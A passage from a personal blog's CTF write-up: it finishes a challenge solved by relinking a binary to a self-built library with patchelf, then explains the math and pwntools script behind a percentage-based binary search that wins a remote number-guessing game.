<p>
Now that we have the compiled library we can use this <code>patchelf</code> command to use our library:<br>
</p>
<pre class="example">
patchelf --replace-needed libnotfound.so ./src/libnotfound.so challenge
</pre>


<p>
We can then check it like this:<br>
</p>
<pre class="example" id="orgf37afd9">
[nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
./src/libnotfound.so
libc.so.6

</pre>

<p>
And then get the flag by running the binary:<br>
</p>
<pre class="example" id="orgc529773">
[nix-shell:~/.../fe22/libnotfound]$ ./challenge
flag{hello? yes, this is flag}
</pre>
</div>
</div>
<div id="outline-container-org56d7b6d" class="outline-2">
<h2 id="org56d7b6d"><span class="section-number-2">7.</span> Guessing Game&#xa0;&#xa0;&#xa0;<span class="tag"><span class="omgacm">omgacm</span></span></h2>
<div class="outline-text-2" id="text-7">
<p>
In this challenge we were basically only given a domain and port.<br>
Connecting to it with netcat, we get the following message:<br>
</p>
<pre class="example" id="org79f1b01">
[nix-shell:~/.../fe22/guess]$ nc guess.hack.fe-ctf.dk 1337
== proof-of-work: disabled ==
 == Welcome to Number Guess ==

I'm thinking of a number between 0 and 4000000 (both inclusive); try and guess which!
You have 99 guesses.  But! You're only allowed to guess too high 3 times.

Good luck!


Round #0
Your guess:
</pre>
<p>
Guessing a number between 0 and 4 million seems impossible, even with 99 guesses in total because we can <i>only</i> guess too high 3 times.<br>
</p>

<p>
So we have to be a little smart about it.<br>
We used a sort of binary search, but based on percentages.<br>
The percentage was calculated based on the following formula:<br>
</p>
\begin{equation*}
p = \dfrac{(g_{high} + 1)}{g_{low}} 
\end{equation*}
<p>
Where \(g_{high}\) is the amount guesses left that can be higher than our target number. And \(g_{low}\) is the amount of guesses that can be lower than the target.<br>
</p>

<p>
\(g_{low}\) is calculated using:<br>
</p>
\begin{equation*}
g_{low} = g_{total} - g_{high}
\end{equation*}

<p>
We calculated our guess using this:<br>
</p>
\begin{equation*}
G = \lfloor(n_{max} - n_{min}) \cdot p \rfloor + n_{min}
\end{equation*}
<p>
Where \(n_{min}\) is our lowest known value, and \(n_{max}\) is our highest known value.<br>
</p>

<p>
Then after each we change \(n_{max}\) or \(n_{min}\) depending on if we are over or under the target number.<br>
</p>

<p>
With this strategy we got pretty far, altough we didn't account for every edge cases. We did some small hacks to account for those, but we never reached 100% accuracy.<br>
So we just kept running the script until we survived all 50 rounds.<br>
</p>

<p>
And after many failed attempts we finally got the flag:<br>
<img src="assets/2022-10-31_18-57-21_screenshot.png" alt="2022-10-31_18-57-21_screenshot.png"><br>
</p>

<p>
Final solve script:<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span class="org-py-import-from">from</span> pwn <span class="org-py-import-from">import</span> *
<span class="org-py-import-from">import</span> math

<span class="org-py-import-from">from</span> multiprocessing <span class="org-py-import-from">import</span> Pool

<span class="org-py-def-class">def</span> <span class="org-py-def">guess</span>(guess: <span class="org-py-builtins">int</span>):
    <span class="org-py-try-if">try</span>:
        <span class="org-py-variable-name">res</span> = io.readuntil(<span class="org-string">"Your guess:"</span>)
        io.sendline(<span class="org-py-builtins">str</span>(guess).encode())
        <span class="org-py-variable-name">res</span> = io.readuntil(<span class="org-string">"\n"</span>)
        <span class="org-keyword">return</span> res.decode()
    <span class="org-keyword">except</span>:
        <span class="org-py-variable-name">res</span> = io.readline()
        <span class="org-keyword">return</span> res.decode()

<span class="org-py-def-class">def</span> <span class="org-py-def">calc_perc</span>(guess_left, guess_high_left):
    <span class="org-keyword">return</span> (guess_high_left + <span class="org-py-number">1</span>) / guess_left


<span class="org-py-def-class">def</span> <span class="org-py-def">strategy</span>(_round):
    <span class="org-py-variable-name">min_max</span> = [<span class="org-py-number">0</span>, <span class="org-py-number">4000000</span>]
    <span class="org-py-variable-name">guess_left</span> = total_guesses
    <span class="org-py-variable-name">guess_low_left</span> = total_guesses - too_high
    <span class="org-py-variable-name">guess_high_left</span> = too_high

    <span class="org-keyword">while</span> <span class="org-py-pseudo-keyword">True</span>:
        log.info(f<span class="org-string">"============</span><span class="org-py-variable-name">{_round}</span><span class="org-string">============="</span>)
        <span class="org-py-variable-name">_range</span> = min_max[<span class="org-py-number">1</span>] - min_max[<span class="org-py-number">0</span>]

        <span class="org-py-try-if">try</span>:
            <span class="org-py-variable-name">perc</span> = calc_perc(guess_low_left, guess_high_left)
            <span class="org-keyword">if</span> perc != <span class="org-py-variable-name">0</span>:
                <span class="org-py-variable-name">_guess</span> = math.floor(_range * perc) + min_max[<span class="org-py-number">0</span>]
            <span class="org-keyword">elif</span> <span class="org-py-variable-name">perc</span> == <span class="org-py-variable-name">1</span>:
                <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
            <span class="org-keyword">else</span>:
                <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>] +<span class="org-py-number">1</span>

            log.info(f<span class="org-string">"MIN MAX: </span><span class="org-py-variable-name">{min_max}</span><span class="org-string">"</span>)
            log.info(f<span class="org-string">"RANGE: </span><span class="org-py-variable-name">{_range}</span><span class="org-string">"</span>)

            <span class="org-keyword">if</span> _range +<span class="org-py-number">1</span> &lt;= <span class="org-py-variable-name">guess_left</span>:
                <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
            <span class="org-keyword">if</span> guess_left &lt;= <span class="org-py-number">1</span> <span class="org-keyword">and</span> _range &gt; <span class="org-py-variable-name">guess_left</span>:
                <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
        <span class="org-keyword">except</span> <span class="org-py-exception-name">ZeroDivisionError</span> <span class="org-keyword">as</span> <span class="org-py-variable-name">e</span>:
            <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]

        log.info(f<span class="org-string">"guesses left: </span><span class="org-py-variable-name">{guess_left}</span><span class="org-string">, high left: </span><span class="org-py-variable-name">{guess_high_left}</span><span class="org-string">, low left: </span><span class="org-py-variable-name">{guess_low_left}</span><span class="org-string">"</span>)
        log.info(f<span class="org-string">"calculated percentage: {perc * 100}%"</span>)

        log.info(f<span class="org-string">"guess: </span><span class="org-py-variable-name">{_guess}</span><span class="org-string">"</span>)
        <span class="org-py-variable-name">answer</span> = guess(_guess)
        log.info(f<span class="org-string">"answer: </span><span class="org-py-variable-name">{answer}</span><span class="org-string">"</span>)
        <span class="org-keyword">if</span> <span class="org-string">"larger"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
            min_max[<span class="org-py-number">0</span>] = _guess
            <span class="org-py-variable-name">guess_left</span> -= <span class="org-py-number">1</span>
            <span class="org-py-variable-name">guess_low_left</span> -= <span class="org-py-number">1</span>
        <span class="org-keyword">elif</span> <span class="org-string">"Round"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
            <span class="org-keyword">return</span> answer
        <span class="org-keyword">elif</span> <span class="org-string">"flag"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
            <span class="org-keyword">return</span> answer
        <span class="org-keyword">elif</span> <span class="org-string">"loose"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
            <span class="org-keyword">return</span> answer
        <span class="org-keyword">else</span>:
            min_max[<span class="org-py-number">1</span>] = _guess
            <span class="org-py-variable-name">guess_left</span> -= <span class="org-py-number">1</span>
            <span class="org-py-variable-name">guess_high_left</span> -= <span class="org-py-number">1</span>

        <span class="org-py-variable-name">guess_low_left</span> = guess_left - guess_high_left
    <span class="org-keyword">return</span>

<span class="org-keyword">if</span> <span class="org-py-builtins">__name__</span> == <span class="org-string">'__main__'</span>:
    <span class="org-py-variable-name">io</span> = remote(<span class="org-string">"guess.hack.fe-ctf.dk"</span>, <span class="org-py-number">1337</span>)
    <span class="org-py-variable-name">total_guesses</span> = <span class="org-py-number">99</span>
    <span class="org-py-variable-name">too_high</span> = <span class="org-py-number">3</span>

    <span class="org-py-variable-name">res</span> = strategy(<span class="org-string">"round 0"</span>)
    <span class="org-keyword">while</span> <span class="org-py-pseudo-keyword">True</span>:
        <span class="org-py-variable-name">res</span> = strategy(res)
        <span class="org-py-try-if">try</span>:
            <span class="org-keyword">if</span> <span class="org-string">"flag"</span> <span class="org-keyword">in</span> res <span class="org-keyword">or</span> <span class="org-string">"loose"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">res</span>:
                log.info(res)
                <span class="org-keyword">break</span>
        <span class="org-keyword">except</span>:
            <span class="org-keyword">pass</span>
        log.info(<span class="org-string">"======================NEW ROUND========================="</span>)

    io.close()
</pre>
</div>
</div>
</div>

<div id="outline-container-org8f7a028" class="outline-2">
<h2 id="org8f7a028"><span class="section-number-2">8.</span> Final words</h2>
<div class="outline-text-2" id="text-8">
<p>
Thank you for taking some time out of your day to read this post.<br>
If you enjoyed this post, feel free to join my <a href="https://discord.gg/t8tKrgdGWu">Discord server</a> to get notification whenever I post something and ask questions if there are any.<br>
</p>
</div>
</div>
</div>
<div id="postamble" class="status">
<div class="footer">
    <div id="copyright">
        <small>&copy; Copyright 2022, C3lphie</small>
    </div>
</div>
</div>
</body>
</html>
